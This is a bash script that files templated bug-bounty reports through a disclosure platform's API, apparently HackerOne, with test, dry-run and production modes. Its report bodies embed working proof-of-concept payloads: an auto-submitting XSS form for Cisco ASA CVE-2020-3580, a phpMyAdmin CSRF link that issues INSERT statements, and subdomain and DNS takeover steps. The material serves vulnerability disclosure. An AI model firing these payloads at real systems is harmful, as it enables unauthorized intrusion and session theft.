#in order to run this script properly you need to define your username and api keys in config.ini
#using export username and apikey

#load credentials and other params
source ./config.ini

if [[ -z "$1" ]] || [[ -z "$2" ]] || [[ -z "$3" ]]; then
    echo -e "Use: \n -t test mode\n testing mode runs the API call against a testing program created in the sandbox\n ${BASH_SOURCE[0]} -t vulnerableDomain bug"
    #example
    
    echo -e "\n-d dry-run mode does not run the API call. Useful to debug the parameters without sending anything to H1\n ${BASH_SOURCE[0]} -d programName vulnerableDomain bug"
    echo -e "\n-p Use production mode after you tested your reports against a dummy project, then you are ready to finally report them! \n ${BASH_SOURCE[0]} -p programName vulnerableDomain bug"
    
    #production mode runs the API call against your real account (be careful)
    # -p is production mode \n -d is dry run mode \n programName vulnerableDomain bug "
    #echo "Example {BASH_SOURCE[0]} att www.att.com [-t, -n, -d] CVE-2020-3580"
    bugs="\nSupported bugs (bug_code): \n Cisco POST XSS (CVE-2020-3580)\n phpmyadmin CSRF (CVE-2019-12616)\n open redirect (open-redirect)\n \
          generic xss (xss)\n s3 subdomain takeover (s3takeover)\n XSS Swagger UI (xssSwagger)\n Azure cloudapp subdomain takeover (azureCloudAppSto)\n Azure DNS Takeover (azure-dns)"
    echo -e $bugs
    exit 1
fi

#input params
mode=$1
if [[ "$mode" == "-t" ]]; then
    #from config file 
    program=$testProgram
    set -- "$1" "" "$2" "$3" "$4" "$5"
    domain=$3
    bug=$4
else
    program=$2
    domain=$3
    bug=$4

fi

#TODO define this as a file template (yaml maybe?)
# creates a report for CVE-2020-3580
if [[ "$bug" == "CVE-2020-3580" ]]; then
    #check config file for details
    #name of the resulting POC file
    file="post-xss-$domain.html"
    URL="$reportsURL/$file"
    echo "POC URL: " $URL

    #replace the url from template to new POC
    sed "s/DOMAIN/$domain/g" $postXSStemplate > $webPath"/"$file

    title='XSS due to CVE-2020-3580 ['$domain']'
    bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
    bodyStepsToRep="Steps To Reproduce \n\n Go to this  URL \n\n "$URL" \n\n HTML POC:\n \n <html>\n  <body>\n <script>history.pushState('', '', '/')</script>\n <form action='https://'$domain'/+CSCOE+/saml/sp/acs?tgname=a' method='POST'>\n <input type='hidden' name='SAMLResponse' value='&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookies&#41;&gt;'/>\n </form>\n <script>\n document.forms[0].submit();\n</script>\n</body>\n</html>\n\n"
    body="$bodySummary$bodyStepsToRep"
    impact="- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.\n - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. \n\n Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.\n\n Supporting Material References\n https://www.exploit-db.com/exploits/47988\n https://twitter.com/sagaryadav8742/status/1275170967527006208\n"\
    severity="medium"
    weaknessId=61

#phpmyadmin CVE-2019-12616
elif [[ "$bug" == "CVE-2019-12616" ]]; then
    if [[ -z "$5" ]]; then
        echo "For this bug you need to include the version of the PhpMyAdmin instance"
        exit 1
    fi
    #specific phpmyin version to be added to the report
    version="$5"
    title='PhpMyAdmin instance vulnerable to CVE-2019-12616 ['$domain']'    
    bodySummary="An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.\n\n Installed version $version  which is vulnerable (phpMyAdmin <= 4.9.0)\n Version number can be checked here https://"$domain"/phpmyadmin/Documentation.html\n\n"
    bodyStepsToRep="PhpMyAdmin endpoint  \n - https://"$domain"/phpmyadmin/\n\nCreate a HTML file with the following content\n\n<html>\n<head>\n<title>POC CVE-2019-12616</title>\n</head>\n<body>\n<a href='https://"$domain"/phpmyadmin/tbl_sql.php?sql_query=INSERT+INTO+\`pma__bookmark\`+(\`id\`%2C+\`dbase\`%2C+\`user\`%2C+\`label\`%2C+\`query\`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark'>View my Pictures!</a>\n</body>\n</html>\n\nAn attacker can create a page using the above HTML code, trick the victim into clicking the URL and performing Insert/Delete actions to the database. "
    body="$bodySummary$bodyStepsToRep"
    impact="An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page. \n\n Supporting Material/References \n* https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n* **Exploit** https://www.exploit-db.com/exploits/46982"
    severity="medium"
    weaknessId=45

#generic open redirect bug
elif [[ "$bug" == "open-redirect" ]]; then
    if [[ -z "$5" ]]; then
        echo "For this bug you need to include the full URL (use evil.com)"
        exit 1
    fi 
    url="$5"
    title='Open redirect ['$domain']'
    bodySummary="There is an open redirection vulnerability that allows an attacker to redirect anyone to malicious sites.\n\n"
    bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n"$url" \n\nAs you can see it redirects to https://www.evil.com"

    body="$bodySummary$bodyStepsToRep"
    impact="Attackers can serve malicious websites that steal passwords or download ransomware to their victims machine due to a redirect.\nThey can also use the URL to trick users into revealing their public IP address.\n"
    severity="low"
    weaknessId=53

#generic reflected xss bug
elif [[ "$bug" == "xss" ]]; then
    if [[ -z "$5" ]]; then
        echo "For this bug you need to include the full URL"
        exit 1
    fi 
    url="$5"
    title='Reflected XSS ['$domain']'
    bodySummary="Reflected cross-site scripting (XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. An attacker can execute JavaScript arbitrary code on the victim's session.\n"
    bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n"$url
    body="$bodySummary$bodyStepsToRep"
    impact="- Perform any action within the application that the user can perform.\n- View any information that the user is able to view.\n- Modify any information that the user is able to modify.\n- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.\n- Steal user's cookie. "
    severity="medium"
    weaknessId=61

#s3 subdomain takeover
elif [[ "$bug" == "s3takeover" ]]; then
    url="https://$domain/index.html"
    title='S3 takeover ['$domain']'
    bodySummary="The subdomain $domain was pointed using CNAME to Amazon S3, but no bucket with that name was registered. This meant that anyone could sign up for Amazon S3, claim the bucket as their own and then serve content on $domain \n"
    bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n"$url
    body="$bodySummary$bodyStepsToRep"
    impact="- It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the $domain domain. This would allow them to post malicious content which would be mistaken for a valid site.\n"
    s*everity="high"
    weaknessId=61

#DNS azure takeover
#input program domain bug 
elif [[ "$bug" == "azure-dns" ]]; then
    pocDomain="poc.$domain"
    title='Azure DNS takeover ['$domain']'
    bodySummary="Note: This is not a regular subdomain takeover but a NS/DNS takeover. \n\n A DNS takeover occurs when an attacker can take control of any DNS server in the chain of DNS servers responsible for resolving a hostname.\nThis was possible because the vulnerable zone/domain was pointing to Azure DNS service (using name servers  \`ns*-*.azure-dns.*\`) but the zone was not created.\n\nA bonus would be advice, since performing this take over has a cost in Azure cloud. \n\n"
    bodyStepsToRep="## Steps To Reproduce\n\n In order to create the POC I added the subdomain \`poc\` to \`$domain\` with a TXT record.\n Run \`dig txt $pocDomain +noall +answer\`\n\nCheck the following output: \n\`$pocDomain 3600 IN TXT 'DNS Zone Takeover POC Deleite'\`\n\n A more impactful POC is possible registering a mail service using the subdomain."
    body="$bodySummary$bodyStepsToRep"
    impact="The impact is high as an attacker could create any subdomain with any content. This would allow them to post malicious content which would be mistaken for a valid site.\nBecause the attacker controls de DNS manager, TXT and MX records can be created, therefore allowing the use of \`$domain\` as email sender. \nThreat actors could perform several attacks:\n\n  -  Cookie Stealing\n  -  Phishing campaigns.\n  -  Bypass Content-Security Policies and CORS."
    severity="high"
    #misconfiguration (CWE-16)
    weaknessId=26

#XSS Swagger UI
elif [[ "$bug" == "xssSwagger" ]]; then
    #input
    if [[ -z "$5" ]]; then
        echo "For this bug you need to include the full URL"
        exit 1
    fi 

    url="$5"
    title='XSS in Swagger ['$domain']'    
    bodySummary="Reflected Cross-Site Scripting (XSS) is a type of injection attack where malicious JavaScript code is injected into a website. When a user visits the affected web page, the JavaScript code executes and its input is reflected in the user's browser. Reflected XSS can be found on this domain which allows an attacker to create a crafted URL which when opened by a user will execute arbitrary Javascript within that user's browser in the context of this domain."
    bodyStepsToRep="Steps To Reproduce\n\n Go to this URL:\n$url\nObserve the JavaScript payload being executed."
    body="$bodySummary$bodyStepsToRep"
    impact="Reflected XSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user.\nBecause it's a Swagger software, it's possible for an attacker to steal the user's api keys/credentials to execute API calls and obtain sensitive information." 
    severity="medium"
    weaknessId=61

#Azure cloudapp subdomain takeover
elif [[ "$bug" == "azureCloudAppSto" ]]; then

    #input
    if [[ -z "$5" ]]; then
        echo "For this bug you need to include the archived URL"
        exit 1
    fi 
    if [[ -z "$6" ]]; then
        echo "For this bug you need to include the CNAME the vuln domain is pointing to"
        exit 1
    fi
 
    archivedURL=$5
    cname=$6

    url="https://$domain"
    title='Azure Cloud App subdomain takeover ['$domain']'    
    bodySummary="The subdomain \`$domain\` was pointing to an Azure App service domain \`$cname\`, but that endpoint was not registered. I just created the instance and added the domain as custom domain. \n\n"
    bodyStepsToRep="## Steps To Reproduce\n\n Go to this URL:\n$url\n\n You will see a blank page, but checking the source code you will see proof of the take over:\n \`\`\`\n <html> \n <!-- poc by pdelteil --> </html>\n \`\`\` \nArchived version: $archivedURL"
    body="$bodySummary$bodyStepsToRep"
    impact="It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the vulnerable domain. This would allow them to post malicious content which would be mistaken for a valid site. \n They could perform several attacks like:\n - Cookie Stealing\n - Phishing campaigns. \n - Bypass Content-Security Policies and CORS." 
    severity="medium"
    weaknessId=26 
else
    echo "$bug, Bug type not found"
    exit 1 
fi 

data='{"data": {"type": "report",
       "attributes": {
       "team_handle": "'$program'",
       "title": "'$title'",
       "vulnerability_information": "'$body'",
       "severity_rating": "'$severity'",
       "weakness_id": '$weaknessId',
       "impact": "'$impact'\n\n'$disclaimer'"}}}'
#TODO parse api response

#dry run mode
if [[ "$mode" == "-d" ]]; then
    echo "Running in dry-run mode"
    echo $data|jq
    #echo "reports URL from config.ini $reportsURL"
    echo "Credentials: "$usernameTesting:$apikeyTesting
    echo "Credentials: "$usernameProduction:$apikeyProduction
    exit 1
fi

#production mode
if [[ "$mode" == "-p" ]]; then
    echo -e "\033[0;31mRunning in production mode\033[0m"
    username=$usernameProduction
    apikey=$apikeyProduction
fi

#testing mode
if [[ "$mode" == "-t" ]]; then
    echo -e "\033[0;33mRunning in testing mode\033[0m\n"
    echo "Program: $program"
    username=$usernameTesting
    apikey=$apikeyTesting
fi 
echo "Making API call"
echo "If error 500 check weakness"
curl -s $apiEndpoint/reports -u "$username:$apikey" \
                  -H 'Content-Type: application/json' \
                  -H 'Accept: application/json' -d "$data"|jq
